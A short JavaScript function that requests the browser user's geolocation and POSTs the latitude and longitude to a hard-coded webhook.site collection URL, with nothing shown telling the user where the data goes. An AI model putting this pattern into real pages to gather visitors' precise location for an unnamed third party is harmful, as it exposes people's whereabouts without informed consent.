function askForLocation() {
  if (!navigator.geolocation) {
    console.log("Geolocation not supported");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch("https://webhook.site/2b377214-0f62-4811-8d77-38ee0db23314", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon }),
      })
      .then(() => console.log("Location sent"))
      .catch((err) => console.error("Error sending location:", err));
    },
    (error) => {
      console.log("Error getting location:", error.message);
    }
  );
}
